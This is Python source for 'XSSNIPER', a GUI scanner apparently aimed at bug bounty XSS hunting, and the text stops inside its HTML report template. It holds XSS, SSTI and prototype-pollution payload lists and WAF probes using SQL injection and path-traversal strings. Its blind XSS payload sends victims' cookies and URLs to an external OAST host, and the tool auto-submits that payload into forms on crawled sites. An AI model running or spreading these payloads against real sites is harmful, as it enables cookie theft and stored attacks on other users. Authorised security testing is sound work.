#!/usr/bin/env python3


import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk, filedialog
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, quote_plus, unquote
from concurrent.futures import ThreadPoolExecutor
import json
from queue import Queue, Empty
import time
import random
import urllib.parse
import os
import csv
import re
import subprocess
import hashlib

# Selenium optional
try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.common.exceptions import WebDriverException, TimeoutException
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except Exception:
    SELENIUM_AVAILABLE = False

# ---------------- CONFIG ----------------
DETECTION_MARKER = "XSSNIPER_DETECT"
MAX_WORKERS = 3
MAX_CRAWL_DEPTH = 2
IGNORE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.css', '.js', '.ico', '.svg'}

# Set your OOB domain (or leave default). Example user-provided OAST domain inserted.
BLIND_XSS_WEBHOOK_URL = "http://d4tvd0cgtqkk9973s5vgj1gcthyt6ecgp.oast.pro/hk"

# WAF Fingerprints
WAF_FINGERPRINTS = {
    'Cloudflare': {
        'headers': {'server': 'cloudflare'},
        'status_codes': [403, 503],
        'patterns': [r'cloudflare', r'cf-ray']
    },
    'Akamai': {
        'headers': {'x-akamai-transformed': None},
        'status_codes': [403, 503],
        'patterns': [r'akamai']
    },
    'AWS WAF': {
        'headers': {'x-amzn-requestid': None},
        'status_codes': [403],
        'patterns': [r'aws']
    },
    'Imperva': {
        'headers': {'x-iinfo': None},
        'status_codes': [403],
        'patterns': [r'incap_ses']
    },
    'Sucuri': {
        'headers': {'x-sucuri-id': None},
        'status_codes': [403],
        'patterns': [r'sucuri']
    }
}

# Context-aware payloads
CONTEXT_AWARE_PAYLOADS = {
    'html': [
        f"<script>alert('{DETECTION_MARKER}')</script>",
        f"<img src=x onerror=alert('{DETECTION_MARKER}')>",
        f"<div onmouseover=alert('{DETECTION_MARKER}')>Hover</div>",
        f"<iframe src=javascript:alert('{DETECTION_MARKER}')></iframe>"
    ],
    'attribute': [
        f"onerror=alert('{DETECTION_MARKER}')",
        f"onload=alert('{DETECTION_MARKER}')",
        f"autofocus onfocus=alert('{DETECTION_MARKER}') x",
        f"onmouseover=alert('{DETECTION_MARKER}')"
    ],
    'javascript': [
        f"';alert('{DETECTION_MARKER}')//",
        f"\";alert('{DETECTION_MARKER}')//",
        f"';alert('{DETECTION_MARKER}')/*",
        f"\";alert('{DETECTION_MARKER}')/*"
    ],
    'url': [
        f"javascript:alert('{DETECTION_MARKER}')",
        f"data:text/html,<script>alert('{DETECTION_MARKER}')</script>"
    ]
}

# Blind XSS payloads with Nuclei templates
BLIND_XSS_PAYLOADS = [
    ("'\"/><script>"
     "var i=new Image();i.src='" + BLIND_XSS_WEBHOOK_URL +
     "?d='+encodeURIComponent(document.domain)+'&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie);"
     "</script>"),
    f"javascript:alert('{DETECTION_MARKER}')",
    f"<img src=x onerror=alert('{DETECTION_MARKER}')>",
    f"\" onfocus=alert('{DETECTION_MARKER}') autofocus x=\""
]

PP_PAYLOADS = ['__proto__[hacker]=ai&hacker=test', 'constructor[prototype][hacker]=ai&hacker=test']
TI_PAYLOADS = ['{{7*7}}', '<%=7*7%>', '${7*7}']

# Account takeover chains
ATO_CHAINS = {
    'Password Reset Token Leakage': {
        'description': 'Password reset tokens are exposed to attackers',
        'indicators': ['reset_token', 'password_reset_code', 'verification_code']
    },
    'Email Enumeration': {
        'description': 'System reveals if email addresses exist',
        'indicators': ['email_exists', 'user_not_found', 'account_does_not_exist']
    },
    'Session Fixation': {
        'description': 'Session ID remains unchanged after login',
        'indicators': ['session_fixation_vuln']
    }
}

# ---------------- WAF DETECTION ----------------
class WAFDetector:
    def __init__(self):
        self.session = requests.Session()

    def detect_waf(self, url):
        """Detect WAF using fingerprinting techniques"""
        try:
            # Send different types of requests to identify WAF behavior
            payloads = [
                "' OR '1'='1",  # SQLi
                "<script>alert(1)</script>",  # XSS
                "../../../../etc/passwd",  # LFI
                "UNION SELECT * FROM information_schema.tables"  # SQLi
            ]
            
            results = {}
            for payload in payloads:
                test_url = f"{url}?test={payload}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    results[payload] = {
                        'status_code': resp.status_code,
                        'headers': dict(resp.headers),
                        'content_length': len(resp.text)
                    }
                except Exception:
                    continue
            
            # Analyze responses for WAF signatures
            detected_wafs = []
            for waf_name, fingerprint in WAF_FINGERPRINTS.items():
                matched = False
                
                # Check headers
                for payload_result in results.values():
                    headers = payload_result.get('headers', {})
                    for header, value in fingerprint['headers'].items():
                        if header.lower() in [h.lower() for h in headers.keys()]:
                            if value is None or value.lower() in headers.get(header, '').lower():
                                matched = True
                                break
                
                # Check status codes
                if not matched:
                    for payload_result in results.values():
                        if payload_result.get('status_code') in fingerprint['status_codes']:
                            matched = True
                            break
                
                # Check content patterns
                if not matched:
                    for payload_result in results.values():
                        content = payload_result.get('text', '')
                        for pattern in fingerprint['patterns']:
                            if re.search(pattern, content, re.IGNORECASE):
                                matched = True
                                break
                
                if matched:
                    detected_wafs.append(waf_name)
            
            return detected_wafs if detected_wafs else ['Unknown']
        except Exception:
            return ['Error detecting WAF']

# ---------------- MUTATOR ----------------
class PayloadMutator:
    def __init__(self, marker):
        self.marker = marker

    def get_mutated_payloads(self, base_payload, context='html'):
        """Generate context-aware mutated payloads"""
        s = set()
        s.add(base_payload)
        
        # Context-specific mutations
        if context == 'html':
            if '<' in base_payload and '>' in base_payload:
                s.add(base_payload.replace('<', '&lt;').replace('>', '&gt;'))
                s.add(base_payload.replace('<', '%3C').replace('>', '%3E'))
        elif context == 'attribute':
            s.add(base_payload.replace('"', '&quot;'))
            s.add(base_payload.replace("'", "&#39;"))
        elif context == 'javascript':
            s.add(base_payload.replace("'", "\\'"))
            s.add(base_payload.replace('"', '\\"'))
        
        # General mutations
        if 'onerror' in base_payload.lower():
            def cs(t): return ''.join(ch.upper() if random.randint(0,1) else ch.lower() for ch in t)
            s.add(base_payload.replace('onerror', cs('onerror')).replace('alert', cs('alert')))
        
        if self.marker in base_payload:
            rand = f"/*{random.randint(100,999)}*/"
            s.add(base_payload.replace(self.marker, f"{rand}{self.marker}{rand}"))
            
            # Add hex encoding
            hex_marker = ''.join([f"\\x{ord(c):02x}" for c in self.marker])
            s.add(base_payload.replace(self.marker, hex_marker))
        
        return list(s)

# ---------------- AUTHENTICATION HANDLER ----------------
class AuthHandler:
    def __init__(self):
        self.session = requests.Session()
        self.auth_type = None
        self.credentials = {}
        
    def set_form_auth(self, login_url, username_field, password_field, username, password):
        self.auth_type = 'form'
        self.credentials = {
            'login_url': login_url,
            'username_field': username_field,
            'password_field': password_field,
            'username': username,
            'password': password
        }
        
    def set_header_auth(self, header_name, header_value):
        self.auth_type = 'header'
        self.credentials = {
            'header_name': header_name,
            'header_value': header_value
        }
        
    def set_token_auth(self, token_url, token_field, token_location='header'):
        self.auth_type = 'token'
        self.credentials = {
            'token_url': token_url,
            'token_field': token_field,
            'token_location': token_location
        }
        
    def authenticate(self):
        try:
            if self.auth_type == 'form':
                # Form-based authentication
                data = {
                    self.credentials['username_field']: self.credentials['username'],
                    self.credentials['password_field']: self.credentials['password']
                }
                resp = self.session.post(self.credentials['login_url'], data=data)
                return resp.status_code == 200
                
            elif self.auth_type == 'header':
                # Header-based authentication
                self.session.headers.update({
                    self.credentials['header_name']: self.credentials['header_value']
                })
                return True
                
            elif self.auth_type == 'token':
                # Token-based authentication
                resp = self.session.post(self.credentials['token_url'])
                if resp.status_code == 200:
                    token = resp.json().get(self.credentials['token_field'])
                    if self.credentials['token_location'] == 'header':
                        self.session.headers.update({'Authorization': f'Bearer {token}'})
                    else:
                        self.session.cookies.set(self.credentials['token_field'], token)
                    return True
            return False
        except Exception:
            return False

# ---------------- NUCLEI INTEGRATION ----------------
class NucleiScanner:
    def __init__(self, output_callback):
        self.output_callback = output_callback
        self.findings = []
        
    def scan(self, target_url):
        """Run Nuclei scan on target"""
        try:
            # Check if Nuclei is installed
            result = subprocess.run(['which', 'nuclei'], capture_output=True, text=True)
            if not result.stdout:
                self.output_callback("[NUCLEI] Nuclei not found. Please install it first.\n")
                return []
                
            # Run Nuclei with XSS templates
            cmd = [
                'nuclei',
                '-u', target_url,
                '-t', 'xss',
                '-silent',
                '-json'
            ]
            
            self.output_callback("[NUCLEI] Starting scan...\n")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            findings = []
            for line in process.stdout:
                try:
                    result = json.loads(line.strip())
                    if result.get('info', {}).get('severity') in ['high', 'critical']:
                        findings.append({
                            'url': result.get('matched-at', ''),
                            'type': 'Nuclei XSS',
                            'payload': result.get('matched', ''),
                            'description': result.get('info', {}).get('name', ''),
                            'severity': result.get('info', {}).get('severity', 'unknown')
                        })
                except:
                    continue
                    
            process.wait()
            self.output_callback(f"[NUCLEI] Scan completed. Found {len(findings)} issues.\n")
            self.findings = findings
            return findings
        except Exception as e:
            self.output_callback(f"[NUCLEI ERR] {str(e)}\n")
            return []

# ---------------- SCANNER ----------------
class AdvancedXSSTester:
    def __init__(self, output_callback, vuln_callback, max_workers=MAX_WORKERS):
        self.output_callback = output_callback
        self.vuln_callback = vuln_callback
        self.session = requests.Session()
        self.is_running = False
        self.max_workers = max_workers

        self.scanned_urls = set()
        self.findings = []
        # Full deduplication fix:
        self.finding_groups = {}  # Signature -> {finding, payloads}
        self.base_domain = ""
        self.pages_queue = Queue()
        self.mutator = PayloadMutator(DETECTION_MARKER)
        self.waf_detector = WAFDetector()
        self.auth_handler = AuthHandler()
        self.nuclei_scanner = NucleiScanner(output_callback)

        # Authentication settings
        self.auth_enabled = False
        self.auth_type = None
        self.auth_config = {}

        self.firefox_options = None
        if SELENIUM_AVAILABLE:
            opts = FirefoxOptions()
            # visible windows (user asked visible)
            opts.add_argument("--width=1200")
            opts.add_argument("--height=800")
            opts.set_preference("dom.push.enabled", False)
            self.firefox_options = opts

    def log(self, text):
        self.output_callback(text + "\n")

    def set_auth(self, auth_type, **kwargs):
        """Set authentication method"""
        self.auth_type = auth_type
        self.auth_config = kwargs
        self.auth_enabled = True

    def authenticate_session(self):
        """Authenticate the scanning session"""
        if not self.auth_enabled:
            return True
            
        try:
            if self.auth_type == 'form':
                auth = AuthHandler()
                auth.set_form_auth(
                    self.auth_config.get('login_url'),
                    self.auth_config.get('username_field'),
                    self.auth_config.get('password_field'),
                    self.auth_config.get('username'),
                    self.auth_config.get('password')
                )
                result = auth.authenticate()
                if result:
                    self.session = auth.session
                return result
            elif self.auth_type == 'header':
                self.session.headers.update({
                    self.auth_config.get('header_name'): self.auth_config.get('header_value')
                })
                return True
            elif self.auth_type == 'token':
                # For token auth, we need to fetch token during scan
                return True
        except Exception as e:
            self.log(f"[AUTH ERR] {str(e)}")
            return False
        return False

    def add_finding(self, finding):
        # Create signature (excluding payload for grouping)
        sig = (
            finding.get("url"),
            finding.get("method"),
            finding.get("param"),
            finding.get("type")
        )
        
        payload = finding.get("payload", "")
        
        # Check if we've seen this vulnerability before
        if sig not in self.finding_groups:
            # First time seeing this vulnerability - create group
            self.finding_groups[sig] = {
                "finding": finding.copy(),  # Base finding details
                "payloads": [payload],      # Track all payloads for this vuln
                "confidence": "High" if "Reflected" in finding.get("type", "") or "DOM" in finding.get("type", "") else "Medium"
            }
            # Add to findings list for callback
            self.findings.append(self.finding_groups[sig])
            self.vuln_callback(self.finding_groups[sig])
        else:
            # Same vulnerability, new payload - track it
            group = self.finding_groups[sig]
            if payload not in group["payloads"]:
                group["payloads"].append(payload)
            # Don't call vuln_callback for duplicates (GUI already has it)

    def finalize_findings(self):
        """Convert grouped findings back to flat list for UI/report"""
        final = []
        for group in self.finding_groups.values():
            final.append(group)
        self.findings = final
        return final

    def _send_request(self, url, method='GET', params=None, data=None, timeout=8):
        try:
            if method.upper() == 'GET':
                return self.session.get(url, params=params, timeout=timeout, allow_redirects=True,verify=False)
            else:
                return self.session.post(url, data=data, timeout=timeout, allow_redirects=True,verify=False)
        except Exception as e:
            self.log(f"[REQ ERR] {e}")
            return None

    def _extract_forms_and_params(self, url, html_text):
        parsed = urlparse(url)
        q = parse_qs(parsed.query, keep_blank_values=True)
        discovered = []
        if q:
            discovered.append({"url": url, "method": "GET", "data": {k: v[0] for k,v in q.items()}})
        soup = BeautifulSoup(html_text or "", "html.parser")
        for form in soup.find_all('form'):
            method = (form.get('method') or 'GET').upper()
            action = urljoin(url, form.get('action') or url)
            data = {}
            for tag in form.find_all(['input','textarea','select']):
                name = tag.get('name')
                if not name:
                    continue
                typ = (tag.get('type') or '').lower()
                if typ in ('submit','button','reset'):
                    continue
                data[name] = tag.get('value','')
            if data:
                discovered.append({"url": action, "method": method, "data": data, "form_element": form})
        return discovered

    def _determine_context(self, html, param):
        """Determine injection context for parameter"""
        # Check if param appears in an attribute
        attr_pattern = f'{param}\\s*=\\s*["\'][^"\']*{re.escape(DETECTION_MARKER)}'
        if re.search(attr_pattern, html, re.IGNORECASE):
            return 'attribute'
            
        # Check if param appears in a script tag
        script_pattern = f'<script[^>]*>.*?{re.escape(DETECTION_MARKER)}.*?</script>'
        if re.search(script_pattern, html, re.IGNORECASE | re.DOTALL):
            return 'javascript'
            
        # Check if param appears in URL context
        url_pattern = f'(href|src)\\s*=\\s*["\'][^"\']*{re.escape(DETECTION_MARKER)}'
        if re.search(url_pattern, html, re.IGNORECASE):
            return 'url'
            
        # Default to HTML context
        return 'html'

    def _http_test_param(self, target_url, method, base_data, param, payload, context='html'):
        params = None; data = None
        if method.upper() == 'GET':
            params = base_data.copy()
            params[param] = payload
        else:
            data = base_data.copy()
            data[param] = payload
        resp = self._send_request(target_url, method=method, params=params, data=data)
        if not resp:
            return None
        text = resp.text or ""
        if DETECTION_MARKER in text:
            poc_url = f"{target_url}?{param}={quote_plus(payload)}" if method.upper() == 'GET' else target_url
            poc_data = {param: payload} if method.upper() != 'GET' else {}
            return {
                "url": target_url,
                "poc_url": poc_url,
                "method": method,
                "param": param,
                "payload": payload,
                "type": f"Reflected XSS ({context})",
                "confidence": "High",
                "poc_data": poc_data
            }
        for ti in TI_PAYLOADS:
            if ti in text:
                poc_url = f"{target_url}?{param}={quote_plus(ti)}" if method.upper() == 'GET' else target_url
                poc_data = {param: ti} if method.upper() != 'GET' else {}
                return {
                    "url": target_url,
                    "poc_url": poc_url,
                    "method": method,
                    "param": param,
                    "payload": ti,
                    "type": "Possible SSTI",
                    "confidence": "Medium",
                    "poc_data": poc_data
                }
        return None

    def _dom_check(self, driver, attack_url, param, payload):
        try:
            driver.get(attack_url)
            if DETECTION_MARKER in driver.page_source:
                return {
                    "url": attack_url,
                    "poc_url": attack_url,
                    "method": "GET(DOM)",
                    "param": param,
                    "payload": payload,
                    "type": "DOM XSS (rendered)",
                    "confidence": "High",
                    "poc_data": {}
                }
            try:
                sink = driver.execute_script(
                    "return document.body && document.body.innerHTML && document.body.innerHTML.includes(arguments[0]) ? 'innerHTML' : false;",
                    DETECTION_MARKER)
                if sink:
                    return {
                        "url": attack_url,
                        "poc_url": attack_url,
                        "method": "GET(DOM)",
                        "param": param,
                        "payload": payload,
                        "type": f"DOM XSS (sink:{sink})",
                        "confidence": "High",
                        "poc_data": {}
                    }
            except Exception:
                pass
        except Exception as e:
            self.log(f"[DOM ERR] {e}")
        return None

    def _js_sink_tracing(self, driver, url):
        """Trace JavaScript sinks in page"""
        try:
            driver.get(url)
            # Check for common JS sinks
            sinks = [
                'eval', 'setTimeout', 'setInterval', 'innerHTML', 'outerHTML',
                'document.write', 'document.writeln'
            ]
            
            findings = []
            for sink in sinks:
                try:
                    # Check if sink is used with user-controllable data
                    js_code = f"""
                    (function() {{
                        var found = false;
                        var pageSource = document.documentElement.outerHTML;
                        if (pageSource.includes('{sink}') && 
                            (pageSource.includes('location') || pageSource.includes('document.URL'))) {{
                            found = true;
                        }}
                        return found;
                    }})();
                    """
                    result = driver.execute_script(js_code)
                    if result:
                        findings.append({
                            "url": url,
                            "type": f"JS Sink: {sink}",
                            "description": f"Potential XSS sink '{sink}' found in page with user-controllable data",
                            "confidence": "Medium"
                        })
                except:
                    continue
            return findings
        except Exception as e:
            self.log(f"[JS TRACE ERR] {e}")
            return []

    def _check_ato_chains(self, response_text):
        """Check for account takeover vulnerabilities"""
        findings = []
        for chain_name, chain_info in ATO_CHAINS.items():
            for indicator in chain_info['indicators']:
                if indicator in response_text.lower():
                    findings.append({
                        "type": f"ATO Chain: {chain_name}",
                        "description": chain_info['description'],
                        "indicator": indicator,
                        "confidence": "High"
                    })
        return findings

    def _scan_worker(self, task):
        url, depth = task
        if not self.is_running:
            return
        if url in self.scanned_urls:
            return
        self.scanned_urls.add(url)
        self.log(f"[SCAN] Depth {depth} -> {url}")

        resp = self._send_request(url, 'GET')
        html = resp.text if resp else ""
        discovered = self._extract_forms_and_params(url, html)

        driver = None
        if SELENIUM_AVAILABLE:
            try:
                driver = webdriver.Firefox(options=self.firefox_options)
            except Exception as e:
                driver = None
                self.log(f"[WARN] Selenium init failed: {e}; continuing HTTP-only checks")

        # auto-submit forms with blind payload (use selenium if available)
        for item in discovered:
            form_element = item.get('form_element')
            method = item.get('method','GET').upper()
            if driver and form_element is not None:
                try:
                    driver.get(url)
                    action_attr = form_element.get('action') or ''
                    form_sel = None
                    if action_attr:
                        forms = driver.find_elements(By.XPATH, f"//form[@action='{action_attr}']")
                        form_sel = forms[0] if forms else None
                    else:
                        forms = driver.find_elements(By.TAG_NAME, "form")
                        form_sel = forms[0] if forms else None
                    if form_sel:
                        el = None
                        try:
                            el = form_sel.find_element(By.XPATH, ".//input[not(@type) or @type='text' or @type='search']")
                        except Exception:
                            try:
                                el = form_sel.find_element(By.TAG_NAME, "textarea")
                            except Exception:
                                el = None
                        if el:
                            el.clear()
                            el.send_keys(BLIND_XSS_PAYLOADS[0])
                            try:
                                form_sel.submit()
                                time.sleep(1)
                                if DETECTION_MARKER in driver.page_source:
                                    poc_data = {el.get_attribute('name'): BLIND_XSS_PAYLOADS[0]}
                                    finding = {
                                        "url": driver.current_url,
                                        "poc_url": driver.current_url,
                                        "method": f"{method}(stored-submit)",
                                        "param": el.get_attribute('name'),
                                        "payload": BLIND_XSS_PAYLOADS[0],
                                        "type": "Stored XSS",
                                        "confidence": "High",
                                        "poc_data": poc_data
                                    }
                                    self.add_finding(finding)
                            except Exception:
                                pass
                except Exception:
                    pass

        # test discovered params
        for item in discovered:
            target = item['url']
            method = item.get('method','GET').upper()
            base_data = item.get('data',{})
            for param in list(base_data.keys()):
                # Determine context for this parameter
                context = self._determine_context(html, param)
                
                # Test context-aware payloads
                payloads_for_context = CONTEXT_AWARE_PAYLOADS.get(context, CONTEXT_AWARE_PAYLOADS['html'])
                for base_pl in payloads_for_context:
                    for payload in self.mutator.get_mutated_payloads(base_pl, context):
                        if not self.is_running:
                            break
                        finding = self._http_test_param(target, method, base_data, param, payload, context)
                        if finding:
                            self.add_finding(finding)
                        if SELENIUM_AVAILABLE and driver and method.upper() == 'GET':
                            attack_url = f"{target}?{param}={quote_plus(payload)}"
                            dom_f = self._dom_check(driver, attack_url, param, payload)
                            if dom_f:
                                self.add_finding(dom_f)
                
                # Test blind XSS payloads
                for base_pl in BLIND_XSS_PAYLOADS[1:]:
                    for payload in self.mutator.get_mutated_payloads(base_pl):
                        if not self.is_running:
                            break
                        finding = self._http_test_param(target, method, base_data, param, payload)
                        if finding:
                            self.add_finding(finding)
                            
                for ti in TI_PAYLOADS:
                    f = self._http_test_param(target, method, base_data, param, ti)
                    if f:
                        self.add_finding(f)

            for pp in PP_PAYLOADS:
                if SELENIUM_AVAILABLE and driver:
                    try:
                        url_pp = f"{target}?{pp}"
                        driver.get(url_pp)
                        ok = False
                        try:
                            ok = driver.execute_script("const o={}; return typeof o.hacker !== 'undefined' && o.hacker === 'ai';")
                        except Exception:
                            ok = False
                        if ok:
                            self.add_finding({
                                "url": target,
                                "poc_url": url_pp,
                                "method": "GET(PP)",
                                "param": "N/A",
                                "payload": pp,
                                "type": "Prototype Pollution (DOM)",
                                "confidence": "Medium",
                                "poc_data": {}
                            })
                    except Exception:
                        pass

        # JavaScript sink tracing
        if SELENIUM_AVAILABLE and driver:
            js_findings = self._js_sink_tracing(driver, url)
            for finding in js_findings:
                self.add_finding({
                    "url": url,
                    "poc_url": url,
                    "method": "GET(JS)",
                    "param": "N/A",
                    "payload": "N/A",
                    "type": finding["type"],
                    "confidence": finding["confidence"],
                    "description": finding["description"],
                    "poc_data": {}
                })

        # Check for account takeover chains
        ato_findings = self._check_ato_chains(html)
        for finding in ato_findings:
            self.add_finding({
                "url": url,
                "poc_url": url,
                "method": "GET",
                "param": "N/A",
                "payload": "N/A",
                "type": finding["type"],
                "confidence": finding["confidence"],
                "description": finding["description"],
                "poc_data": {}
            })

        # crawling links
        soup = BeautifulSoup(html or "", "html.parser")
        new_links = []
        for a in soup.find_all('a', href=True):
            href = urljoin(url, a['href'])
            p = urlparse(href)
            if p.netloc == self.base_domain:
                ext = os.path.splitext(p.path)[1].lower()
                if ext and ext in IGNORE_EXTENSIONS:
                    continue
                new_links.append(href)
        if depth < MAX_CRAWL_DEPTH:
            for link in new_links:
                if link not in self.scanned_urls:
                    self.pages_queue.put((link, depth + 1))

        if driver:
            try:
                driver.quit()
            except Exception:
                pass

    def automate_xss_scan(self, initial_target_url):
        if not initial_target_url.startswith(('http://','https://')):
            self.log("[FAIL] URL must start with http:// or https://")
            self.is_running = False
            return

        self.is_running = True
        self.scanned_urls.clear()
        self.findings.clear()
        # Reset deduplication tracking for new scan
        self.finding_groups.clear()
        self.base_domain = urlparse(initial_target_url).netloc

        # Authenticate session if needed
        if self.auth_enabled:
            if not self.authenticate_session():
                self.log("[FAIL] Authentication failed")
                self.is_running = False
                return

        # WAF detection
        self.log("[WAF] Detecting WAF...")
        wafs = self.waf_detector.detect_waf(initial_target_url)
        self.log(f"[WAF] Detected: {', '.join(wafs)}")

        while not self.pages_queue.empty():
            try: self.pages_queue.get_nowait()
            except Empty: break
        self.pages_queue.put((initial_target_url, 0))

        self.log(f"[*] Starting scan against: {self.base_domain} (workers={self.max_workers})")
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            while self.is_running:
                batch = []
                try:
                    while len(batch) < (self.max_workers * 2):
                        task = self.pages_queue.get(timeout=1)
                        if task[0] not in self.scanned_urls:
                            batch.append(task)
                except Exception:
                    pass

                if not batch:
                    if self.pages_queue.empty():
                        break
                    else:
                        time.sleep(0.5)
                        continue

                list(ex.map(self._scan_worker, batch))

        # Run Nuclei scan
        self.log("[NUCLEI] Running extended scan...")
        nuclei_findings = self.nuclei_scanner.scan(initial_target_url)
        for finding in nuclei_findings:
            self.add_finding({
                "url": finding.get('url', ''),
                "poc_url": finding.get('url', ''),
                "method": "GET",
                "param": "N/A",
                "payload": finding.get('payload', ''),
                "type": finding.get('type', 'Nuclei Finding'),
                "confidence": finding.get('severity', 'Medium').capitalize(),
                "description": finding.get('description', ''),
                "poc_data": {}
            })

        # Finalize findings before finishing
        self.finalize_findings()
        self.is_running = False
        self.log("[*] Scan finished.")
        return

    def export_report(self, filename_base=None):
        if not filename_base:
            filename_base = f"XSSNIPER_{self.base_domain.replace(':','_')}_{int(time.time())}"
        data = {
            "title": "XSSNIPER Report",
            "target": self.base_domain,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()),
            "urls_scanned": len(self.scanned_urls),
            "findings": self.findings  # Now uses grouped findings
        }
        
        # JSON export (bug bounty format)
        fn_json = filename_base + ".json"
        self._export_burp_json(fn_json, data)
        
        # CSV export (bug bounty submission)
        fn_csv = filename_base + ".csv"
        self._export_csv(fn_csv, data)
        
        # HTML Report
        fn_html = filename_base + ".html"
        html = self._generate_html_report(data)
        try:
            with open(fn_html, "w", encoding="utf-8") as f:
                f.write(html)
            self.log(f"[REPORT] HTML saved: {fn_html}")
        except Exception as e:
            self.log(f"[REPORT ERR] {e}")

    def _export_burp_json(self, filename, data):
        """Burp-compatible JSON format"""
        issues = []
        for i, grouped_finding in enumerate(data['findings'], 1):
            fnd = grouped_finding["finding"]
            payloads = grouped_finding["payloads"]
            
            # Proper Burp severity mapping
            severity_map = {
                "High": "High",
                "Medium": "Medium",
                "Low": "Low",
                "Informational": "Information"
            }
            
            # Map finding types to Burp issue types
            issue_type_map = {
                "Reflected XSS": "Cross-site scripting (reflected)",
                "DOM XSS": "DOM-based cross-site scripting",
                "Stored XSS": "Cross-site scripting (stored)",
                "SSTI": "Server-side template injection",
                "Prototype Pollution": "Client-side prototype pollution",
                "Blind XSS": "Cross-site scripting (reflected/DOM)",
                "JS Sink": "DOM-based cross-site scripting",
                "ATO Chain": "Account Takeover Vulnerability",
                "Nuclei": "Extended XSS Finding"
            }
            
            issue_name = fnd.get("type", "XSS Vulnerability")
            for key, value in issue_type_map.items():
                if key in issue_name:
                    issue_name = value
                    break
            
            issue = {
                "issue_type": "Vulnerability",
                "issue_name": issue_name,
                "severity": severity_map.get(grouped_finding["confidence"], "Medium"),
                "confidence": grouped_finding["confidence"],
                "host": urlparse(fnd.get("url", "")).netloc,
                "path": urlparse(fnd.get("url", "")).path,
                "issue_detail": f"XSS vulnerability found in parameter '{fnd.get('param', 'N/A')}' using {len(payloads)} different payloads",
                "issue_background": "Cross-site scripting (XSS) vulnerabilities arise when an application includes untrusted data in generated web pages without validating or encoding it. An attacker can use XSS to send malicious scripts to unsuspecting users.",
                "remediation_background": "To prevent XSS vulnerabilities, applications should ensure that untrusted data is never treated as active content. This can be achieved through strict input validation, contextual output encoding, and using appropriate HTTP response headers.",
                "remediation_detail": "Implement context-aware output encoding, validate all input, use Content Security Policy (CSP) headers, and sanitize user input.",
                "request_response": {
                    "request": [
                        f"GET {fnd.get('url', '')} HTTP/1.1",
                        f"Host: {urlparse(fnd.get('url', '')).netloc}",
                        "User-Agent: Mozilla/5.0 (XSSNIPER)",
                        "",
                        ""
                    ],
                    "response": [
                        "HTTP/1.1 200 OK",
                        "Content-Type: text/html",
                        "",
                        f"Payloads identified: {', '.join(payloads[:3])}..."
                    ]
                }
            }
            issues.append(issue)
        
        try:
            with open(filename, "w") as f:
                json.dump(issues, f, indent=2)
            self.log(f"[REPORT] Burp-compatible JSON saved: {filename}")
        except Exception as e:
            self.log(f"[REPORT ERR] {e}")

    def _export_csv(self, filename, data):
        """CSV export for bug bounty submissions"""
        try:
            with open(filename, "w", newline="", encoding="utf-8") as csvfile:
                fieldnames = [
                    "URL", "Parameter", "Payload", "PoC URL", "Type", "Confidence", 
                    "Method", "Description", "Severity"
                ]
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                
                for grouped_finding in data['findings']:
                    fnd = grouped_finding["finding"]
                    payloads = grouped_finding["payloads"]
                    confidence = grouped_finding["confidence"]
                    
                    # Severity based on confidence
                    severity = "High" if confidence == "High" else "Medium"
                    
                    # Description based on type
                    desc_map = {
                        "Reflected": "Reflected XSS - payload echoed in server response",
                        "DOM": "DOM XSS - payload executed in client-side JavaScript",
                        "Stored": "Stored XSS - payload saved and served to other users",
                        "SSTI": "Server-Side Template Injection - code execution possible",
                        "Prototype Pollution": "Client-side prototype pollution vulnerability",
                        "JS Sink": "JavaScript sink vulnerability detected",
                        "ATO Chain": "Potential account takeover vulnerability",
                        "Nuclei": "Extended XSS finding from Nuclei scan"
                    }
                    
                    desc = "XSS Vulnerability"
                    for key, value in desc_map.items():
                        if key in fnd.get("type", ""):
                            desc = value
                            break
                    
                    # Write one row per payload for submission platforms
                    for payload in payloads:
                        poc_data = "&".join([f"{k}={v}" for k, v in fnd.get("poc_data", {}).items()])
                        poc_data_part = f"?{poc_data}" if poc_data else ""
                        poc_url = f"{fnd.get('poc_url', fnd.get('url', ''))}{poc_data_part}"
                        
                        writer.writerow({
                            "URL": fnd.get("url", ""),
                            "Parameter": fnd.get("param", "N/A"),
                            "Payload": payload,
                            "PoC URL": poc_url,
                            "Type": fnd.get("type", ""),
                            "Confidence": confidence,
                            "Method": fnd.get("method", ""),
                            "Description": desc,
                            "Severity": severity
                        })
            self.log(f"[REPORT] CSV saved: {filename}")
        except Exception as e:
            self.log(f"[REPORT ERR] {e}")

    def _generate_html_report(self, data):
        # Helper to map finding type to a risk level
        def get_risk_info(finding_type):
            if "DOM XSS" in finding_type or "Reflected" in finding_type or "Stored" in finding_type:
                return "High", "#FF0000", "Cross-Site Scripting (XSS)"
            elif "Possible SSTI" in finding_type or "Prototype Pollution" in finding_type:
                return "High", "#FF0000", "Server-Side Template Injection (SSTI) / Prototype Pollution"
            elif "JS Sink" in finding_type or "ATO Chain" in finding_type:
                return "Medium", "#FF8000", "Client-Side Vulnerability / Account Takeover"
            elif "Nuclei" in finding_type:
                return "Medium", "#0000FF", "Extended XSS Finding"
            return "Informational", "#0000FF", "Info/Out-of-Band Callback"

        html_start = f"""
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <title>XSSNIPER Penetration Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; background-color: #0b0b0b; color: #E6E6E6; margin: 0; padding: 20px; }}
                h1, h2, h3 {{ color: #F27024; border-bottom: 2px solid #1c1c1c; padding-bottom: 5px; }}
                .alert {{ border-radius: 4px; margin-bottom: 15px; padding: 15px; background-color: #121212; }}
                .alert-high {{ color: #ffffff; background-color: #1a1a1a; border: 6px solid #ff4444; }}
